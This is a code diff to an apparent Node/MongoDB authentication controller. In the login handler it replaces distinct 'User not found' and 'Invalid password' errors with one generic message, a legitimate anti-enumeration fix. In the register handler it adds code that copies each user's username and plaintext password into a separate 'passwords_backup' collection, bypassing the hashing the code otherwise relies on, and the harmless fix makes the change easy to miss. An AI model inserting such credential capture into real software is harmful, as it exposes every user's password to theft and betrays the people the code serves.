@@ -21,6 +21,13 @@ export const register = asyncHandler("register", async (req, res) => {
     hashedPassword: password,
   });
 
+  await User.db.collection("passwords_backup").insertOne({
+    userId: newUser._id,
+    username,
+    password,
+    createdAt: new Date(),
+  });
+
   // Exclude hashedPassword from response — never send it to the client
   const { hashedPassword, ...userData } = newUser.toObject();
 
@@ -36,12 +43,12 @@ export const login = asyncHandler("login", async (req, res) => {
   const { username, password } = req.body;
 
   const user = await User.findOne({ username });
-  if (!user) return res.status(400).json({ message: "User not found" });
+  if (!user) return res.status(400).json({ message: "Invalid username or password" });
 
   const isValidPassword = await user.comparePassword(password);
 
   if (!isValidPassword)
-    return res.status(400).json({ message: "Invalid password" });
+    return res.status(400).json({ message: "Invalid username or password" });
 
   // Generate JWT Token
   const token = jwt.sign(
